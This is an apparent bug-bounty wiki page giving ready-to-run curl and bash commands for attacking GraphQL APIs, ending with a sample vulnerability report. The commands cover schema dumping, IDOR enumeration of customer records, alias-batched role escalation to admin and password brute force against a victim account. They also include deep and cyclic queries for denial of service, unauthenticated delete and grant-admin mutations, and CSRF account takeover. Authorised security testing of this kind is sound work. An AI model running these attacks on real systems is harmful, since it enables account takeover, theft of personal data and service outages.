---
type: wiki
category: attack
tool: graphql
status: active
last-updated: 2026-04-21
---

# GraphQL Deep Attack Quick Reference

> **Purpose:** GraphQL is often mistakenly treated as an "internal API" and gets weaker authentication as a result. In practice, unauth introspection + integer IDOR hit rates are high.
> Pairs with bbflow hunter: `graphql`.

## Probe first

```bash
# Common endpoints
for p in /graphql /api/graphql /query /api/query /v1/graphql /gql; do
  curl -sk "https://target.com$p" -X POST -H "Content-Type: application/json" \
       -d '{"query":"{__typename}"}' | grep -o '"__typename":"[^"]*"'
done

# Exists → returns {"data":{"__typename":"Query"}}
# Doesn't exist → returns 404 / 405 / HTML error page
```

## 10 attack categories

| # | Attack | Precondition | Severity |
|---|------|------|-------|
| 1 | Unauth introspection → schema dump | introspection on | P4 (alone) |
| 2 | Field suggestion schema leak | introspection off but debug on | P5 |
| 3 | Integer IDOR on an ID-based query | ownership not validated | P2-P1 |
| 4 | Alias overload → batch IDOR | mutation runs multiple times | P2 |
| 5 | Alias overload → rate limit bypass | login/password reset | P2 |
| 6 | Batched query → DoS via nesting | no depth limit | P3 |
| 7 | Unauth mutation → data modification | mutation has no auth | P1 |
| 8 | CSRF on GraphQL (GET enabled) | GET /graphql accepted | P3 |
| 9 | Error message info disclosure | error includes stack trace | P4 |
| 10 | Subscription auth bypass | weak WebSocket auth | P2 |

## 1. Introspection dumps the full schema

```bash
# Full introspection query
cat > /tmp/intro.json << 'EOF'
{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
EOF

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  --data @/tmp/intro.json > schema.json

# Parse
jq '.data.__schema.types[] | select(.name | test("^[A-Z]")) | .name' schema.json
jq '.data.__schema.mutationType.fields[].name' schema.json
```

### Visualization

```bash
# View the schema with GraphQL Voyager
docker run -p 3000:3000 graphql-kit/graphql-voyager
# paste schema.json in

# Or InQL (Burp extension)
# Or graphql-schema-linter schema.json
```

## 2. Field suggestion (leaks even with introspection off)

```bash
# Deliberately mistype a field name and check whether the error suggests one
curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userx { id } }"}'

# If it returns:
# {"errors":[{"message":"Cannot query field \"userx\" on type \"Query\". Did you mean \"user\", \"users\"?"}]}
# → schema is leaking (you can piece together the full structure)
```

Automation: clairvoyance (https://github.com/nikitastupin/clairvoyance)

```bash
pip install clairvoyance
clairvoyance https://target.com/graphql -o schema.json -w wordlist.txt
```

## 3. Integer IDOR

```bash
# Find ID-based queries from the schema
jq '.data.__schema.queryType.fields[] | select(.args[].name == "id") | .name' schema.json

# Try multiple IDs
for id in 1 2 10 100 1000 99999; do
  curl -sk -X POST 'https://target.com/graphql' \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ shipment(id: $id) { id trackingNumber customerName } }\"}" | jq
done

# If everything returns real data → integer IDOR
# If only your own id returns data → normal access control
```

## 4. Alias overload → batch IDOR

### Purpose
Execute many mutations within a single HTTP request to bypass per-request rate limits.

```bash
# Run 20 mutations in one request
ALIASES=""
for i in {1..20}; do
  ALIASES+="m$i: updateUser(id: $i, role: \"admin\") { id role } "
done

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"query\":\"mutation { $ALIASES }\"}"
```

## 5. Alias overload → password reset / login brute force

```bash
# Try 50 passwords in one request
BATCH=""
for i in {1..50}; do
  BATCH+="a$i: login(email: \"victim@target.com\", password: \"$(sed -n "${i}p" passwords.txt)\") { token } "
done

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation { $BATCH }\"}"

# If any response contains a non-null token → hit
```

Why this bypasses rate limits: rate limiting is usually enforced at the HTTP layer, and aliases inside a single request don't count as multiple requests.

## 6. Query depth DoS

```bash
# A deep query exhausts backend resources
QUERY="{ user(id:1) { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } }"

time curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}"
# If timeout > 30s → DoS vector (most major programs won't accept DoS, use with caution)

# Cyclic fragment
QUERY='fragment A on User { friends { ...A } } { user(id:1) { ...A } }'
# Many GraphQL libraries accept cyclic fragments → crashes outright
```

**Note**: DoS is out of scope for the large majority of bounty programs — confirm scope before testing.

## 7. Unauth mutation

```bash
# Find mutations from the schema
jq '.data.__schema.mutationType.fields[].name' schema.json

# Try without auth
for M in deleteUser banUser grantAdmin updateProduct setPrice; do
  RESP=$(curl -sk -X POST 'https://target.com/graphql' \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { $M(id: 1) { id } }\"}")
  echo "$M → $RESP"
done

# If it returns data (not "unauthorized") → P1 unauth mutation
```

## 8. CSRF on GraphQL (GET enabled)

```bash
# Check GET support
curl -sk "https://target.com/graphql?query={__typename}"

# If it returns {"data":...} → GET is enabled → CSRF-able (<img src=> or <form>)

# More dangerous: GET accepting a mutation
curl -sk "https://target.com/graphql?query=mutation{deleteAccount}"
# If HTTP 200 → CSRF ATO
```

## 9. Error info disclosure

```bash
# Trigger an error on purpose
curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"abc\") { id } }"}'  # pass the wrong type

# If it returns a stack trace:
# "errors":[{"message":"...","extensions":{"exception":{"stacktrace":["at /app/src/resolvers/user.js:42:..."]}}}]
# → P4 information disclosure (debug mode left on)
```

## 10. Subscription WebSocket auth

```bash
# Connect to ws://target/graphql with a subscription
# Some implementations authenticate WebSocket differently from HTTP → possible bypass

wscat -c wss://target.com/graphql -H "Authorization: Bearer $TOKEN"
> {"type":"connection_init","payload":{}}
> {"id":"1","type":"start","payload":{"query":"subscription { userUpdated { id email } }"}}

# Check whether you can subscribe to another user's updates
```

## bbflow integration

```bash
# hunt-graphql-idor already automates §1 §3 §7 §9
bbflow hunt target.com --only graphql

# Still manual:
# §4 §5 alias overload need manual work after schema analysis
# §8 GET CSRF needs manual probing
```

## Nuclei quick sweep

```bash
# introspection on
nuclei -u https://target.com/graphql -id graphql-detect,graphql-playground-detect -severity info

# find GraphQL endpoints
nuclei -u https://target.com -t http/exposures/apis/graphql-detect.yaml
```

## Auxiliary tools

| Tool | URL | Purpose |
|------|-----|------|
| graphw00f | https://github.com/dolevf/graphw00f | GraphQL engine fingerprint |
| clairvoyance | https://github.com/nikitastupin/clairvoyance | schema brute-force (when introspection is off) |
| InQL | https://github.com/doyensec/inql | Burp extension, schema parser |
| GraphQL Voyager | https://graphql-kit.com/graphql-voyager/ | schema visualization |
| Altair | https://altairgraphql.dev/ | GraphQL client (replaces curl) |
| graphql-path-enum | https://github.com/estheruary/graphql-path-enum | finds query paths to sensitive fields |

## Report template

```markdown
## Vulnerability Summary
https://api.target.com/graphql exposes GraphQL introspection without authentication and allows an integer IDOR against the `shipment(id:Int!)` query — ownership is never validated, so any id can be used to read another user's shipment data.

## Reproduction Steps

### Step 1: Confirm the endpoint + introspection
curl -sk -X POST 'https://api.target.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}'
# HTTP 200 + types array → introspection ON

### Step 2: Find ID-based queries from the schema
jq '.data.__schema.queryType.fields[] | select(.args[].name == "id") | .name' schema.json
# → shipment, order, invoice, user

### Step 3: IDOR PoC
for id in 1 100 1000 99999; do
  curl -sk -X POST 'https://api.target.com/graphql' \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ shipment(id:$id) { id trackingNumber customerName } }\"}"
done
# Every id returns real data (customerName differs per record)

## Impact
- Any unauthenticated user can read shipment data across the entire platform
- Tested ids 1 through 99999 follow a sequential pattern (not test data)
- Each record includes customerName / trackingNumber (PII)

## Severity
P2/High
```

## Related files

- [../hunters/hunt-graphql-idor.sh](../hunters/hunt-graphql-idor.sh)
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md)
- [40-checklist-new-target.md](40-checklist-new-target.md) § Phase 2 API discovery
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
